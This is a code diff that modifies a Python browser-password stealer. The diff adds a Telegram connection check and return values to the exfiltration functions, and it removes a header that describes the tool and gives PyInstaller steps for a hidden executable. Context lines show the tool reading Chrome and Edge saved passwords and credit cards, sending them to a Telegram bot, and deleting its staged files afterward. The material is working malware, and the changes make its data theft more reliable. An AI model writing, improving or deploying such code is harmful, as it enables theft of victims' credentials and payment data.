@@ -1,14 +1,3 @@
-#==========#=============================================================#
-#  SOCIAL  # author: social/s4cial on github                             #
-#==========# browser passwords steal, sends data to a TELEGRAM bot;      #
-# PYTHON 2 # modified version                                            #
-#==========#=============================================================#
-# PY > EXE #                                                             #
-#==========##==========##==========##==========##==========##============#
-# pip install pyinstaller                                                #
-# cd path/to/files/                                                      #
-# pyinstaller --clean --onefile --noconsole --i icon.ico browsersteal.py #
-#==========##==========##==========##==========##==========##============#
 
 import os
 if os.name != "nt":
@@ -61,9 +50,10 @@ def send_telegram_message(text):
         "parse_mode": "HTML"
     }
     try:
-        requests.post(url, json=payload, timeout=10)
+        resp = requests.post(url, json=payload, timeout=10)
+        return resp.ok
     except:
-        pass
+        return False
 
 def send_telegram_document(file_path, caption=""):
     """Send a file (photo/zip) as a document to Telegram."""
@@ -72,11 +62,34 @@ def send_telegram_document(file_path, caption=""):
         files = {"document": f}
         data = {"chat_id": TELEGRAM_CHAT, "caption": caption}
         try:
-            requests.post(url, files=files, data=data, timeout=15)
+            resp = requests.post(url, files=files, data=data, timeout=15)
+            return resp.ok
         except:
-            pass
+            return False
 
-# ========== REST OF THE ORIGINAL STEALER LOGIC (UNMODIFIED) ==========
+def test_telegram_connection():
+    """Send a test packet. Return True if successful, False otherwise."""
+    test_msg = "🔍 Test packet – connection successful."
+    success = send_telegram_message(test_msg)
+    if not success:
+        # Also try sending a simple "test" without HTML just in case
+        try:
+            url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
+            resp = requests.post(url, json={"chat_id": TELEGRAM_CHAT, "text": "Test packet"}, timeout=5)
+            success = resp.ok
+        except:
+            success = False
+    return success
+
+# ========== TEST TELEGRAM FIRST ==========
+print("[*] Testing Telegram connection...")
+if not test_telegram_connection():
+    # If test fails, exit immediately without any stealing
+    print("[!] Telegram test failed. Exiting.")
+    sys.exit(1)
+print("[+] Telegram test passed. Proceeding with data extraction.")
+
+# ========== REST OF THE ORIGINAL STEALER LOGIC ==========
 
 APP_DATA_PATH = os.environ['LOCALAPPDATA']
 DB_PATH = r'Google\Chrome\User Data\Default\Login Data'
@@ -230,7 +243,7 @@ os.remove('C:\\ProgramData\\Passwords.txt')
 os.remove(screenshot_path)
 os.remove(zip_path)
 
-# CHROME & EDGE GRAB (passwords + credit cards) - sending to Telegram instead of Discord
+# CHROME & EDGE GRAB (passwords + credit cards) - sending to Telegram
 
 def get_master_key():
     try:
